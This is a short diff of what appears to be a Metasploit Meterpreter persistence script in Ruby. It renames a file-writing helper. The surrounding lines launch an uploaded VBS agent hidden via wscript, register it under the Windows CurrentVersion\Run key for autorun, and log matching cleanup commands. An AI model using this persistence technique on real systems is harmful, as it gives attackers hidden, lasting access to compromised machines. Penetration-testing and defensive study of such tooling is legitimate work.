@@ -99,7 +99,7 @@ print_status("Uploaded the persistent agent to #{tempvbs}")
 #
 proc = session.sys.process.execute("wscript \"#{tempvbs}\"", nil, {'Hidden' => true})
 print_status("Agent executed with PID #{proc.pid}")
-file_local_write2file(dest, "kill #{proc.pid}\n")
+file_local_write(dest, "kill #{proc.pid}\n")
 #
 # Setup the multi/handler if requested
 #
@@ -127,7 +127,7 @@ if(install)
 	if(key)
 		registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,tempvbs,"REG_SZ")
 		print_status("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-		file_local_write2file(dest, "reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v #{nam}\n")
+		file_local_write(dest, "reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v #{nam}\n")
 	else
 		print_status("Error: failed to open the registry key for writing")
 	end
